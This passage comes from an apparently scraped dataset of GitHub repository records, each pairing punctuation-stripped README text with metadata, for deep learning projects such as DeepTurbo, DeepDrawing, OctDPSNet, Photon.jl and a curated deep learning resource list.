DeepTurbo with DeepTurbo RNN CUDAVISIBLEDEVICES 0 python3 6 main py encoder Turborate3757 decoder TurboAErate3rnn decnumunit 100 decnumlayer 5 numiterft 5 channel awgn numtraindec 5 coderatek 1 coderaten 3 snrteststart 1 5 snrtestend 4 0 snrpoints 12 numiteration 6 isparallel 1 traindecchannellow 1 5 traindecchannelhigh 2 0 issameinterleaver 1 declr 0 0001 numblock 10000 batchsize 100 blocklen 100 numepoch 200 printtesttraj 2 Train DeepTurbo with DeepTurbo CNN CUDAVISIBLEDEVICES 0 python3 6 main py encoder Turborate3757 decoder TurboAErate3cnn decnumunit 100 decnumlayer 5 numiterft 5 channel awgn numtraindec 5 coderatek 1 coderaten 3 snrteststart 1 5 snrtestend 4 0 snrpoints 12 numiteration 6 isparallel 1 traindecchannellow 1 5 traindecchannelhigh 2 0 issameinterleaver 1 declr 0 0001 numblock 10000 batchsize 100 blocklen 100 numepoch 200 printtesttraj You probably need to fine tune on this model e g increase the batch size reduce the learning rate and so on As original DeepTurbo is not conducted under this framework I am not sure if this will replicate what paper shows easily I am actively working on this,2019-09-24T15:18:48Z,2019-12-10T14:35:03Z,Python,yihanjiang,User,3,12,6,71,master,yihanjiang,1,0,0,0,1,0,0
Sophia-11,Deep-Learning-Highlights,artificial-intelligence#deep-learning#machine-learning#neural-networks,by KingsSophia Last updated 2019 11 16 Update log 2019 11 05 2019 11 07 Table of Contents 1 https github com Sophia 11 Deep Learning Highlights 2 https github com Sophia 11 Deep Learning Highlights 1 1 Deepnet https github com nitishsrivastava deepnet 2 Deeppy https github com andersbll deeppy 3 JavaNN https github com ivan vasilev neuralnetworks 4 hebel https github com hannes brt hebel 5 Mocha jl https github com pluskid Mocha jl 6 OpenDL https github com guoding83128 OpenDL 7 cuDNN https developer nvidia com cuDNN 8 MGL http melisgl github io mgl pax world mgl manual html 9 Knet jl https github com denizyuret Knet jl 10 Nvidia DIGITS a web app based on Caffe https github com NVIDIA DIGITS 11 Neon Python based Deep Learning Framework https github com NervanaSystems neon 12 Keras Theano based Deep Learning Library http keras io 13 Chainer A flexible framework of neural networks for deep learning http chainer org 14 RNNLM Toolkit http rnnlm org 15 RNNLIB A recurrent neural network library http sourceforge net p rnnl wiki Home 16 char rnn https github com karpathy char rnn 17 MatConvNet CNNs for MATLAB https github com vlfeat matconvnet 18 Minerva a fast and flexible tool for deep learning on multi GPU https github com dmlc minerva 19 Brainstorm Fast flexible and fun neural networks https github com IDSIA brainstorm 20 Tensorflow Open source software library for numerical computation using data flow graphs https github com tensorflow tensorflow 21 Caffe http caffe berkeleyvision org 22 Torch7 http torch ch 23 Theano http deeplearning net software theano 24 cuda convnet https code google com p cuda convnet2 25 convetjs https github com karpathy convnetjs 25 Ccv http libccv org doc doc convnet 26 NuPIC http numenta org nupic html 27 DeepLearning4J http deeplearning4j org 28 Brain https github com harthur brain 29 DeepLearnToolbox https github com rasmusbergpalm DeepLearnToolbox 30 DMTK Microsoft Distributed Machine Learning Tookit https github com Microsoft DMTK 31 Scikit Flow Simplified interface for TensorFlow mimicking Scikit Learn https github com google skflow 32 MXnet Lightweight Portable Flexible Distributed Mobile Deep Learning framework https github com dmlc mxnet 33 Veles Samsung Distributed machine learning platform https github com Samsung veles 34 Marvin A Minimalist GPU only N Dimensional ConvNets Framework https github com PrincetonVision marvin 35 Apache SINGA A General Distributed Deep Learning Platform http singa incubator apache org 36 DSSTNE Amazon s library for building Deep Learning models https github com amznlabs amazon dsstne 37 SyntaxNet Google s syntactic parser A TensorFlow dependency library https github com tensorflow models tree master syntaxnet 38 mlpack A scalable Machine Learning library http mlpack org 39 Torchnet Torch based Deep Learning Library https github com torchnet torchnet 40 Paddle PArallel Distributed Deep LEarning by Baidu https github com baidu paddle 41 NeuPy Theano based Python library for ANN and Deep Learning http neupy com 42 Lasagne a lightweight library to build and train neural networks in Theano https github com Lasagne Lasagne 43 nolearn wrappers and abstractions around existing neural network libraries most notably Lasagne https github com dnouri nolearn 44 Sonnet a library for constructing neural networks by Google s DeepMind https github com deepmind sonnet 45 PyTorch Tensors and Dynamic neural networks in Python with strong GPU acceleration https github com pytorch pytorch 46 CNTK Microsoft Cognitive Toolkit https github com Microsoft CNTK 47 Serpent AI Game agent framework Use any video game as a deep learning sandbox https github com SerpentAI SerpentAI 48 Caffe2 A New Lightweight Modular and Scalable Deep Learning Framework https github com caffe2 caffe2 49 deeplearn js Hardware accelerated deep learning and linear algebra NumPy library for the web https github com PAIR code deeplearnjs 50 TensorForce A TensorFlow library for applied reinforcement learning https github com reinforceio tensorforce 51 Coach Reinforcement Learning Coach by Intel AI Lab https github com NervanaSystems coach 52 albumentations A fast and framework agnostic image augmentation library https github com albu albumentations Galen Andrew http homes cs washington edu galen Geoffrey Hinton http www cs toronto edu hinton George Dahl http www cs toronto edu gdahl Graham Taylor http www uoguelph ca gwtaylor Grgoire Montavon http gregoire montavon name Guido Francisco Montfar http personal homepages mis mpg de montufar Guillaume Desjardins http brainlogging wordpress com Hannes Schulz http www ais uni bonn de schulz Hlne Paugam Moisy http www lri fr hpaugam Honglak Lee http web eecs umich edu honglak Hugo Larochelle http www dmi usherb ca larocheh indexen html Ilya Sutskever http www cs toronto edu ilya Itamar Arel http mil engr utk edu nmil member 2 html James Martens http www cs toronto edu jmartens Jason Morton http www jasonmorton com Jason Weston http www thespermwhale com jaseweston Jeff Dean http research google com pubs jeff html Jiquan Mgiam http cs stanford edu jngiam Joseph Turian http www etud iro umontreal ca turian Joshua Matthew Susskind http aclab ca users josh index html Jrgen Schmidhuber http www idsia ch juergen Justin A Blanco https sites google com site blancousna Koray Kavukcuoglu http koray kavukcuoglu org KyungHyun Cho http users ics aalto fi kcho Li Deng http research microsoft com en us people deng Lucas Theis http www kyb tuebingen mpg de nc employee details lucas html Ludovic Arnold http ludovicarnold altervista org home Marc Aurelio Ranzato http www cs nyu edu ranzato Martin Lngkvist http aass oru se mlt Misha Denil http mdenil com Mohammad Norouzi http www cs toronto edu norouzi Nando de Freitas http www cs ubc ca nando Navdeep Jaitly http www cs utoronto ca ndjaitly Nicolas Le Roux http nicolas le roux name Nitish Srivastava http www cs toronto edu nitish Noel Lopes https www cisuc uc pt people show 2028 Oriol Vinyals http www cs berkeley edu vinyals Aaron Courville http aaroncourville wordpress com Abdel rahman Mohamed http www cs toronto edu asamir Adam Coates http cs stanford edu acoates Alex Acero http research microsoft com en us people alexac Alex Krizhevsky http www cs utoronto ca kriz index html Alexander Ilin http users ics aalto fi alexilin Amos Storkey http homepages inf ed ac uk amos Andrej Karpathy http cs stanford edu karpathy Andrew M Saxe http www stanford edu asaxe Andrew Ng http www cs stanford edu people ang Andrew W Senior http research google com pubs author37792 html Andriy Mnih http www gatsby ucl ac uk amnih Ayse Naz Erkan http www cs nyu edu naz Benjamin Schrauwen http reslab elis ugent be benjamin Bernardete Ribeiro https www cisuc uc pt people show 2020 Bo David Chen http vision caltech edu bchen3 Site BoDavidChen html Boureau Y Lan http cs nyu edu ylan Brian Kingsbury http researcher watson ibm com researcher view php person us bedk Christopher Manning http nlp stanford edu manning Clement Farabet http www clement farabet net Dan Claudiu Cirean http www idsia ch ciresan David Reichert http serre lab clps brown edu person david reichert Derek Rose http mil engr utk edu nmil member 5 html Dong Yu http research microsoft com en us people dongyu default aspx Drausin Wulsin http www seas upenn edu wulsin Erik M Schmidt http music ece drexel edu people eschmidt Eugenio Culurciello https engineering purdue edu BME People viewPersonById resourceid 71333 Frank Seide http research microsoft com en us people fseide Pascal Vincent http www iro umontreal ca vincentp Patrick Nguyen https sites google com site drpngx Pedro Domingos http homes cs washington edu pedrod Peggy Series http homepages inf ed ac uk pseries Pierre Sermanet http cs nyu edu sermanet Piotr Mirowski http www cs nyu edu mirowski Quoc V Le http ai stanford edu quocle Reinhold Scherer http bci tugraz at scherer Richard Socher http www socher org Rob Fergus http cs nyu edu fergus pmwiki pmwiki php Robert Coop http mil engr utk edu nmil member 19 html Robert Gens http homes cs washington edu rcg Roger Grosse http people csail mit edu rgrosse Ronan Collobert http ronan collobert com Ruslan Salakhutdinov http www utstat toronto edu rsalakhu Sebastian Gerwinn http www kyb tuebingen mpg de nc employee details sgerwinn html Stphane Mallat http www cmap polytechnique fr mallat Sven Behnke http www ais uni bonn de behnke Tapani Raiko http users ics aalto fi praiko Tara Sainath https sites google com site tsainath Tijmen Tieleman http www cs toronto edu tijmen Tom Karnowski http mil engr utk edu nmil member 36 html Tom Mikolov https research facebook com tomas mikolov Ueli Meier http www idsia ch meier Vincent Vanhoucke http vincent vanhoucke com Volodymyr Mnih http www cs toronto edu vmnih Yann LeCun http yann lecun com Yichuan Tang http www cs toronto edu tang Yoshua Bengio http www iro umontreal ca bengioy yoshuaen index html Yotaro Kubo http yota ro Youzhi Will Zou http ai stanford edu wzou Fei Fei Li http vision stanford edu feifeili Ian Goodfellow https research google com pubs 105214 html Robert Laganire http www site uottawa ca laganier,2019-10-20T03:25:28Z,2019-11-29T13:30:40Z,n/a,Sophia-11,User,1,10,1,9,master,Sophia-11,1,0,0,0,0,0,0
susanli2016,Natural-Language-Processing-with-Deep-Learning-in-Python-,n/a,Natural Language Processing with Deep Learning in Python The repository for the course in Udemy,2019-09-23T20:00:15Z,2019-12-10T16:22:14Z,Jupyter Notebook,susanli2016,User,3,9,5,7,master,susanli2016,1,0,0,0,0,0,0
dmbernaal,Daedalus,n/a,Deep Learning Research R1 Normalizing Activation with Good Init and Activations In this notebook we will explore different initialization methods along with activation function and see how each effect the activation output with N layers Links to papers https arxiv org ftp arxiv papers 1908 1908 08681 pdf https arxiv org pdf 1511 06422 pdf https arxiv org pdf 1502 01852 pdf R2 Self Normalising Neural Networks In this notebook we will explore Self Normalising Neural Networks Links to papers https medium com damoncivin self normalising neural networks snn 2a972c1d421 https becominghuman ai paper repro self normalizing neural networks 84d7df676902 https arxiv org pdf 1706 02515 pdf,2019-10-11T19:39:00Z,2019-11-15T03:14:58Z,Jupyter Notebook,dmbernaal,User,1,9,0,4,master,dmbernaal,1,0,0,0,0,0,0
jiayouwyhit,deepdrawing,n/a,DeepDrawing A Deep Learning Approach to Graph Drawing Introduction This is the code repository for our IEEE VIS19 Paper entitled DeepDrawing A Deep Learning Approach to Graph Drawing We propose a deep learning based approach to learn from existing graph drawings of a similar drawing style Then given a new graph the trained model directly predict the layout i e the coordinates of the nodes of a drawing style similar to the training dataset You can also check our project webpage http yong wang org proj deepDrawing html for more details Citation If you find our work useful in your research please consider citing ARTICLEwang19deepdrawing author Wang Yong and Jin Zhihua and Wang Qianwen and Cui Weiwei and Ma Tengfei and Qu Huamin title DeepDrawing A Deep Learning Approach to Graph Drawing journal IEEE Transactions on Visualization and Computer Graphics year 2019 volume number pages 1 1 Installation Download the code You can simply download the code by using github git clone https github com jiayouwyhit deepdrawing git Prerequisites Install Conda https docs conda io en latest on your computer Then run the following command to install all the dependencies conda env create name deepdrawing file config env yml Enter the corresponding conda environment conda activate deepdrawing All the following command will be executed in this environment Note that it may be a bit tricky to successfully install PyTorch geometric PyG Here we list the package versions where we successfully install it by using the above conda installation command OS Ubuntu 16 04 5 LTS Xenial Xerus gcc 5 4 0 cuda 9 0 python 3 6 8 torch 1 0 0 torch scatter 1 1 2 torch sparse 0 2 4 torch cluster 1 2 4 torch spline conv 1 0 6 torch geometric 1 0 3 We tested the case where gcc version 7 4 0 but failed to successfully install the dependencies of torch geometric So we would advise readers to use the above package versions in order to successfully build the environment For other issues of installing torch scatter torch sparse torch cluster and torch spline conv please refer to the official installation guidelines of PyG https pytorch geometric readthedocs io en latest notes installation html Launch Model Training For demo purpose please download the grid dataset from this link https drive google com drive folders 1LjxuVpeIA3Z0CT7ctFr U3tmakVj2aR usp sharing and put all the corresponding data folders to the folder maindatafolder data Then go to the main folder and run python maintrain py Then the terminal will print out the model information and the corresponding training epochs You may also use the following command to track the training progress tensorboard logdir tensorboard port 6007 If you open your browser http localhost 6007 you will be able to see the loss plots like this In this repository we implemented the GraphLSTM model with two different libraries PyG https github com rusty1s pytorchgeometric and DGL https docs dgl ai tutorials models index html According to our observation the PyG based implementation is faster than the DGL based implementation You can change the configurations in the file maintrain py Model Testing The trained model will be saved in the folder maindatafolder modelsave You may select the appropriate model and change the configurations in the file maintest py We have also put a file of the trained model in the this link https drive google com drive folders 1LjxuVpeIA3Z0CT7ctFr U3tmakVj2aR usp sharing You may put it to maindatafolder modelsave to run a quick demo Use the followinig command to check the testing result python maintest py The visualization results can be found in the folder maindatafolder testingresults Data Here we use the grid dataset as an example to show how the data look like Basically all the data will follow the following format Core Attribute ori object topological information about the graph includes id graph id nodelist a list contains node information one row contains nodeid nodegroup cx cy r fill linelist a list contains line information one row contains nodeid1 nodeid2 representing those two nodes are connected width canvas width height canvas height xidx specify which nodes current feature corresponding to xridx specify the node in original order index corresponding to which nodes in the new order index x input feature pos normalized coordinates Auxiliary attribute len the number of nodes boundingbox object specifying the bounding box of layout includes left right top bottom adj adjacency matrix graph adjacency table connected whether this graph is connected Note The code in this repository is under active development Also the current approach is only tested on graphs of a small number of nodes,2019-10-16T09:49:16Z,2019-12-11T03:31:39Z,Python,jiayouwyhit,User,2,9,0,6,master,jiayouwyhit#jnzhihuoo1,2,0,0,0,1,0,0
ZitongYu,STVEN_rPPGNet,n/a,STVENrPPGNet Main code of ICCV2019 paper Remote Heart Rate Measurement from Highly Compressed Facial Videos an End to end Deep Learning Solution with Video Enhancement pdf https arxiv org pdf 1907 11921 pdf Note that the specific dataloader data preprocessing and postprocessing should be done by users depending on particular datasets image https github com ZitongYu STVENrPPGNet blob master network png It is just for research purpose and commercial use is not allowed Citation If you use the STVEN or rPPGNet please cite inproceedingsyu2019remote nbsp nbsp nbsp nbsptitle Remote Heart Rate Measurement from Highly Compressed Facial Videos an End to end Deep Learning Solution with Video Enhancement nbsp nbsp nbsp nbspauthor Yu Zitong and Peng Wei and Li Xiaobai and Hong Xiaopeng and Zhao Guoying nbsp nbsp nbsp nbspbooktitle International Conference on Computer Vision ICCV nbsp nbsp nbsp nbspyear 2019,2019-10-08T17:17:05Z,2019-11-26T02:53:38Z,Python,ZitongYu,User,2,9,1,35,master,ZitongYu,1,0,0,1,0,0,0
adamwespiser,deep-learning-koans,deep-learning#education#flux#ijulia#julia#koans#literate-programming#notebooks,Deep Learning Koans A collection of Deep Learning Koans written for Flux jl and Julia Programming language Colab Link Run these koans on Colab https colab research google com github adamwespiser deep learning koans blob master What is a Koan A Koan is a short puzzle designed to elucidate understanding upon completion The plural koans are also a format of interactive programming puzzles designed to be run locally and to teach the user programming through a series of challenges in order of increasing difficultly This is exactly what this project is Thus a koan critically consists of three components A text introduction to a concept and problem Section of code that applies the concept A test that is not passed untill the concept is applied correctly This format borrows a lot from the pedalogical approach of Daniel P Friedman and his book The Little Schemer https www ccs neu edu home matthias BTLS A list of koans projects for a variety of platforms and languages can be found here on github https github com ahmdrefat awesome koans blob master koans en md So what s this project trying to do This project attempts to take the Koans approach to teaching programming and apply that to the subject matter of deep learning in Julia To do this we will focus first on giving a skippable overview of Julia then move on to demonstrating the library Flux jl https github com FluxML Flux jl Technically this project is implemented as a series of IJulia Notebooks that you generate from source code host locally with IJulia the extension to run Julia in a Jupyter Notebook then interactively modify the code until it works Links and additional resources are scattered throughout the material Why Julia First Julia offer a couple advantages compared to Python and R that make it superior for some projects namely its gradual typing improves the developer experience and code reliability and compilation to LLVM makes Julia code faster than R Matlab Python However Julia is young and does not have the depth and breadth of machine learning and web development packages that make Python a safe production choice or the depth of statistical packages and academic work that makes R so revered Nonetheless Julia s LLVM compilcation offers huge advantage for Deep Learning in research and practice we can actually program using a single language instead of having to call an underlying C library like Tensorflow or PyTorch This requires a programming language differential programming which is currently being studied and integrated into Julia through the Zygote project Why Flux Flux is a Julia only neural network library with basic differential programing capability with a library of optimizers layers and helper functions that can facilitate deep learning and has first class support for GPU allocation Thus solutions like Julia Flux that use a single language to compile to fast LLVM bytecode and leverage GPUs are a good future for for Deep Learning as they are conceptually simpler to understand than current solutions like PyTorch TensorFlow with the same performance However and you ll see this very soon throgh the koans the API maturity is not quite there Chapters Contents The chapter outline is as follows 1 Introduction to Julia notebooks t001introduction ipynb 2 Working With Data In Julia notebooks t002dataingestion ipynb 3 Intro to Flux notebooks t003fluxintro ipynb 4 Convolutional Neural Networks and Layers in Flux notebooks t004convlayers ipynb 5 Recurrent Neural Networks and Layers in Flux notebooks t005recurrentlayers 6 Flux optimization notebooks t006optimization ipynb 7 Putting in all together and more examples notebooks t007conclusion ipynb Attribution Note Many examples of these koans are borrowed and modified from sources in the Flux source code or examples in the Flux Documentation The Flux source code can be found here Flux jl https github com FluxML Flux jl How to Run To run this project you will need Julia installed locally which is available here https julialang org downloads index html Additionally you will need NVIDIA drivers installed on your machine for the GPU based examples in Chapter 7 Clone the Repository or download directly from Github git clone https github com adamwespiser deep learning koans git Run julia in the deep learning koans directory cd deep learning koans julia project Instantiate the environment which will download all the needed packages julia using Pkg Pkg instantiate Build the notebooks julia include deps build jl Open the Julia Notebooks julia using IJulia julia notebook dir Dev The projects is built using the script found in deps build jl deps build jl Adding a package to Project toml Manifest toml For pkg X we can get the UUID with the following julia Pkg METADATAcompatibleuuid X Then add an entry to deps in Project toml Finally we will want to re populate the Manifest toml which we can do as followings julia project julia Pkg resolve julia Pkg instantiate Test Run all the notebooks at once julia project test runkoansource jl,2019-10-12T04:28:22Z,2019-12-12T03:37:50Z,Jupyter Notebook,adamwespiser,User,1,8,0,19,master,adamwespiser,1,0,0,0,0,0,0
zy1996code,nlp_basic_model,n/a,,2019-09-21T08:50:26Z,2019-12-08T14:33:48Z,Python,zy1996code,User,1,8,1,8,master,zy1996code,1,0,0,0,0,0,0
matsuren,octDPSNet,n/a,OctDPSNet PyTorch implementation of Octave Deep Plane sweeping Network Reducing Spatial Redundancy for Learning based Plane sweeping Stereo http dx doi org 10 1109 ACCESS 2019 2947195 octdpsnetvideo img overlay png http ieeetv ieee org media ieeetvmobile xplore access gavideo 2947195 mp4 If you use OctDPSNet for your academic research please cite the following paper articleoctDPSNet2019 author R Komatsu H Fujii Y Tamura A Yamashita and H Asama journal IEEE Access title Octave Deep Plane sweeping Network Reducing Spatial Redundancy for Learning based Plane sweeping Stereo year 2019 volume 7 pages 150306 150317 doi 10 1109 ACCESS 2019 2947195 Demo You can try octDPSNet in Google Colab here octDPSNetdemocolab ipynb https colab research google com github matsuren octDPSNet blob master octDPSNetdemocolab ipynb After running all cells point cloud results ply will be downloaded You can visualize it by some tools e g Meshlab http www meshlab net Examples of the point cloud are displayed here Combine with visual SLAM If you want to use OctDPSNet in real world we recommend you to use it with visual SLAM since it s easy to get camera poses Please see openvslam branch Requirements python 3 5 CUDA pipenv Install We recommend you to use pipenv to install the correct version of the python libraries since some libraries e g scipy changed their API which causes some errors We might modify our source code later to get it working on the latest version of the libraries Install pipenv bash pip install pipenv Setup virtual environment bash git clone https github com matsuren octDPSNet git cd octDPSNet pipenv install dev Since PyTorch is not included in Pipfile you need to install PyTorch in the virtual environment via pip The official instruction is available here latest https pytorch org get started locally or here previous versions https pytorch org get started previous versions via pip Please install PyTorch according to your CUDA version and python version If you re using CUDA 10 0 and Python 3 5 run the following commands to install PyTorch 1 3 0 bash Enter the virtual environment pipenv shell Install PyTorch via pip pip install https download pytorch org whl cu100 torch 1 3 0 2Bcu100 cp35 cp35m linuxx8664 whl Verify your installation Run the following command to make sure that you ve installed octDPSNet correctly bash Make sure you re in the virtual environment python demo py After running the command you will see point cloud in Open3D visualization window and results ply will be generated in the current directory Prepare dataset Download DeMoN dataset We use DeMoN datasets https lmb informatik uni freiburg de people ummenhof depthmotionnet for training and testing Please follow the instruction here sunghoonim DPSNet https github com sunghoonim DPSNet data praparation to prepare the datasets or run the following command bash cd DATASETROOT mkdir demon cd demon git clone depth 1 https github com matsuren octDPSNet git tmpdir bash tmpdir preparation downloadtestdata sh python tmpdir preparation preparedatatest py Download train dataset Please wait for a while It takes up huge disk space around 300GB bash tmpdir preparation downloadtraindata sh Remove bugfix cd traindata mv rgbdbugfix10to203dtrain h5 rgbd10to203dtrain h5 mv rgbdbugfix10to20handheldtrain h5 rgbd10to20handheldtrain h5 mv rgbdbugfix20toinf3dtrain h5 rgbd20toinf3dtrain h5 mv rgbdbugfix20toinfhandheldtrain h5 rgbd20toinfhandheldtrain h5 cd python tmpdir preparation preparedatatrain py For the preparation of ETH3D dataset please see ETH3D dataset ETH3D dataset Train Training bash python train py DATASETROOT demon train log output alpha 0 75 Note If you want to try other alpha value alpha please check How to choose How to choose Reduce GPU memory consumption If you don t have enough GPU memory Set smaller number for nlabel Default is 64 batch size Default is 16 E g bash python train py DATASETROOT demon train log output nlabel 16 batch size 8 Test DeMoN dataset bash cd octDPSNet python test py DATASETROOT hogehoge alpha 0 75 Note If you want to try your own pretrained model please add a flag pretrained PATHTOMODEL ETH3D dataset Download dataset Download ETH3D dataset from DeepMVS project page https phuang17 github io DeepMVS index html and sunghoonim DPSNet https github com sunghoonim DPSNet by executing the following commands bash cd DATASETROOT wget https www dropbox com s n26v56eqj0jpd60 ETH3Dresults zip unzip ETH3Dresults zip git clone depth 1 https github com sunghoonim DPSNet git DPSNetTmp cp a DPSNetTmp dataset ETH3Dresults rm ETH3Dresults zip DPSNetTmp rf Test on ETH3D dataset bash cd octDPSNet python testETH3D py DATASETROOT ETH3Dresults sequence length 2 alpha 0 75 Note If you want to try your own pretrained model please add a flag pretrained PATHTOMODEL Test results on ETH3D dataset You can download the test results on ETH3D dataset here ETH3Dresults zip https onedrive live com authkey 21AG4yhtP0Yp39t6o id 781BBA0C6BA3A88E 214672 cid 781BBA0C6BA3A88E The directory structure is the same as DeepMVS https phuang17 github io DeepMVS index html How to choose OctDPSNet has a hyper parameter alpha that controls the ratio of low spatial frequency features For example 0 75 implies that 75 of the features are low spatial frequency features If is increased then less memory and computation resources are used but useful information may be lost We recommend you to choose alpha value from the following 0 25 nbsp nbsp Ch 24 and Cl 8 0 5 nbsp nbsp nbsp Ch 16 and Cl 16 0 75 nbsp nbsp Ch 8 and Cl 24 0 875 nbsp Ch 4 and Cl 28 0 9375 Ch 2 and Cl 30 Here Ch and Cl are the channel numbers of the high and low spatial frequency features respectively Acknowledgement This repository is based on sunghoonim DPSNet https github com sunghoonim DPSNet,2019-10-10T02:05:04Z,2019-11-28T03:13:12Z,Python,matsuren,User,2,8,0,27,master,matsuren,1,0,1,0,2,0,0
DSC-MIT,devfest-deeplearning,n/a,GDG DevFest ML Track The links to the required notebooks are 1 Python https colab research google com drive 1EUEF88n3RlNgtrKWxnan41GH3cBbE2D 2 Pandas https colab research google com drive 1FcVYtlkNfXN3pL1VLZXYY2Hn01BEWUnH 3 Numpy https colab research google com drive 12BBsTEkEkAtGn3vxnMmAclxkRbcK2Q4 4 Sklearn https colab research google com drive 1Ip0JfYDzXqQJrXoPaw4M77Pg8i2polI 5 MNIST using Keras https colab research google com drive 14OeP0srLDOAbfjx2IU7O 3PVbFISed04 6 GANs https colab research google com drive 1Ey1JXlXVmgCSfQZIdcq6x0 wXYR2Zz2j 7 Extra LSTMs https colab research google com github tensorflow tpu blob master tools colab shakespearewithtpuandkeras ipynb References Python 1 CS231n Tutorial http cs231n github io python numpy tutorial Pandas 1 PyData s Tutorial https pandas pydata org pandas docs stable gettingstarted tutorials html 2 learndatasci com https www learndatasci com tutorials python pandas tutorial complete introduction for beginners Numpy 1 CS231n Tutorial http cs231n github io python numpy tutorial Sklearn 1 scikit learn Tutorials https scikit learn org stable tutorial index html 2 Machine Learning on Coursera https www coursera org learn machine learning Deep Learning 1 deeplearning ai course https www coursera org specializations deep learning 2 TensorFlow Tutorial https www tensorflow org tutorials GANs 1 Research paper https papers nips cc paper 5423 generative adversarial nets pdf 2 GANs from Scratch https medium com ai society gans from scratch 1 a deep introduction with code in pytorch and tensorflow cb03cdcdba0f,2019-09-28T14:59:27Z,2019-10-07T11:13:47Z,n/a,DSC-MIT,Organization,6,7,4,9,master,Squadrick,1,0,0,0,0,0,1
falloutdurham,pytorchupandrunning,n/a,pytorchupandrunning Code for Programming PyTorch for Deep Learning,2019-09-22T19:12:47Z,2019-12-06T12:38:38Z,Jupyter Notebook,falloutdurham,User,2,7,8,5,master,falloutdurham,1,0,0,0,1,0,0
MGH-LMIC,graynet_keras,n/a,GrayNet Keras A versatile model for Deep learning application for CT images Keras implementation Publications Stone AI Urinary Stone Detection on CT Images Using Deep Convolutional Neural Networks Evaluation of Model Performance and Generalization Radiology AI 2019 link https pubs rsna org doi 10 1148 ryai 2019180066 Organ segmentation C MIMI 2019 presentation link https cdn ymaws com siim org resource resmgr mimi19 oral4 GrayNetKim pdf How to install shell go to your project folder cd git clone https github com LMIC MGH graynetkeras How to use python from keras layers import Input GlobalAveragePooling2D Dense from keras models import Model from graynetkeras import DenseNet121GrayNet Set your input inputshape 256 256 1 inputtensor Input inputshape name input Add densnet archtecture with pretrained weight of graynet last layer of graynet is global average pooling layer model Densenet121GrayNet inputtensor inputtensor weights graynet wreg None Set a fully connected layer for your model output model output output Dense units 1 activation sigmoid name fc output Your label model Model inputs inputtensor outputs output name mainmodel model summary compile your model and run Please see example ipynb for more example Jupyter notebook Model archtecture How to excute Jupyter example codes shell cp GrayNetexample ipynb GrayNetexample ipynb Then see run the codes,2019-09-22T21:02:47Z,2019-11-29T10:29:20Z,Python,MGH-LMIC,Organization,4,7,2,13,master,Paul-Kim,1,0,0,0,0,0,0
neurallayer,Photon.jl,n/a,License http img shields io badge license MIT brightgreen svg style flat LICENSE md Build Status https travis ci org neurallayer Photon jl svg branch master https travis ci org neurallayer Photon jl https img shields io badge docs dev blue svg https neurallayer github io Photon jl dev codecov https codecov io gh neurallayer Photon jl branch master graph badge svg https codecov io gh neurallayer Photon jl Join the julia slack https img shields io badge chat slack 23photon yellow svg https slackinvite julialang org Photon is a developer friendly framework for Deep Learning in Julia Under the hood it leverages Knet and it provides a Keras like API on top of that Photon is right now still beta quality and the main goal is to see what API s work best So expect still to see some API changes in the upcoming releases Installation Since Photon is improving rapidly the package can be best installed with the Julia package manager directly from the Github repository From the Julia REPL type to enter the Pkg REPL mode and run pkg add https github com neurallayer Photon jl In the future it will be possible to use pkg add Photon Documentation Click here https neurallayer github io Photon jl dev to go to the documentation site Usage Defining a model is straightforward and should look familiar if you used Keras or MXnet in the past A two layers fully connected network julia model Sequential Dense 256 relu Dense 10 A convolutional network with maxpooling note that Photon takes care of the flattening so you can connect a Dense layer directly to a convolutional layer julia model Sequential Conv2D 16 3 relu Conv2D 16 3 relu MaxPool2D Dense 256 relu Dense 10 Or a recurrent LSTM network julia model Sequential LSTM 256 3 Dense 64 relu Dense 10 And also the training of the model can be done through an easy API julia workout Workout model nll train workout data epochs 10 Performance The combination of Deep Learning and Julia is a very performant one Especially when running the models on a GPU Some tests reveal speedups of up to 100 when compared one of the most popular framework Keras Tensorflow 2 0 The code that has been used to test is available in the performance sub directory Features The main goal is to provide a user friendly API for Machine Learning that enables developing both prototype and production ready solutions while remaining fast Some of the key features Good support for the various ways you can to retrieve and transform your data Develop models with a minimal amount of code Get all the required insights and visualizations into the performance of the model Todo There remain many things to do Add more typing to assist the compiler and development Extend unit tests to cover more code 90 Implement more models including trained weights resnet Write tutorials and improve code documentation Finalise the API s so we can release 1 0 Implement more complex layers like attention More loss functions Once stable create proper back end abstraction to support other frameworks And b t w we are always open in accepting contributions License Photon is provided under the MIT open source license References We used several other open source frameworks for code and inspiration Knet pronounced kay net is the Ko University deep learning framework implemented in Julia by Deniz Yuret and collaborators It is right now the back end for Photon partially due to its excellent performance on GPU s Flux we use it for inspiration This has to be one of the most beautiful code bases out there Keras and MXNet for their well thought out API s Also copied some of their excellent documentation for layers and losses And of course Julia that enables writing very fast deep learning applications,2019-10-25T17:18:27Z,2019-12-12T12:25:49Z,Julia,neurallayer,Organization,1,7,0,113,master,jbaron,1,0,0,0,0,0,0
enginBozkurt,Deep-Reinforcement-Learning-for-Enterprise-Nanodegree,artificial-intelligence#deep-reinforcement-learning#reinforcement-learning#reinforcement-learning-algorithms#reinforcement-learning-playground,Deep Reinforcement Learning for Enterprise Nanodegree Udacity Deep Reinforcement Learning for Enterprise Nanodegree Projects My implementations and the projects of Udacity s Deep Reinforcement Learning Nanodegree program Reinforcement https user images githubusercontent com 30608533 68156230 7bc39480 ff5c 11e9 8111 2670546bbfd2 jpg,2019-10-31T09:23:02Z,2019-11-12T18:26:51Z,Jupyter Notebook,enginBozkurt,User,1,6,4,17,master,enginBozkurt,1,0,0,0,0,0,0
hustcxl,Deep-learning-in-PHM,deep-learning#fault-diagnosis#health-management#phm#rul,Deep learning in PHM Deep learning in PHMDeep learning in fault diagnosisDeep learning in remaining useful life prediction The purpose of this repository is to collect the application research of deep learning in PHM field collect and organize the open source algorithm resources and provide a platform for researchers to learn and communicate papers review papers Zhao R et al Deep learning and its applications to machine health monitoring Mechanical Systems and Signal Processing 2019 115 p 213 237 link https www sciencedirect com science article pii S0888327018303108 Khan S and T Yairi A review on the application of deep learning in system health management Mechanical Systems and Signal Processing 2018 107 p 241 265 link https www sciencedirect com science article pii S0888327017306064 Hoang D and H Kang A survey on Deep Learning based bearing fault diagnosis Neurocomputing 2019 335 p 327 335 link https www sciencedirect com science article pii S0925231218312657 Liu R et al Artificial intelligence for fault diagnosis of rotating machinery A review Mechanical Systems and Signal Processing 2018 108 p 33 47 link https www sciencedirect com science article pii S0888327018300748 Lee J et al Prognostics and health management design for rotary machinery systemsReviews methodology and applications Mechanical Systems and Signal Processing 2014 42 1 p 314 334 link https www sciencedirect com science article pii S0888327013002860 Chen X et al Basic research on machinery fault diagnostics Past present and future trends Frontiers of Mechanical Engineering 2018 13 2 p 264 291 link https link 